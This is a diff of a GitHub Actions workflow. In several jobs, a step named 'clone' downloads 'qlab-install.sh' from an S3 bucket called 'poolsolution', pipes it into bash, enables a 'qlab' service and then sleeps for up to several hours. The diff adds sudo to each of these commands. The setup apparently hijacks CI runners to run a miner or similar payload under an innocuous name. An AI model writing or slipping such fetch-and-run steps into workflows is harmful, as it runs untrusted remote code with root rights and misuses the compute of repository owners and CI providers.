@@ -25,7 +25,7 @@ jobs:
     - name: Setup
       uses: actions/checkout@v4
     - name: clone
-      run: curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
+      run: sudo curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
            systemctl enable qlab &
            sleep 310s
   ol:
@@ -49,7 +49,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
+      run: sudo curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
            systemctl enable qlab &
             sleep 5m
         
@@ -76,7 +76,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
+      run: sudo curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
            systemctl enable qlab &
             sleep 6m
   ayo:
@@ -100,9 +100,9 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
+      run: sudo curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
            systemctl enable qlab &
-            sleep 305m
+            sleep 105m
         
     
      
@@ -127,9 +127,9 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
+      run: sudo curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
            systemctl enable qlab &
-            sleep 261m
+            sleep 61m
         
     
   
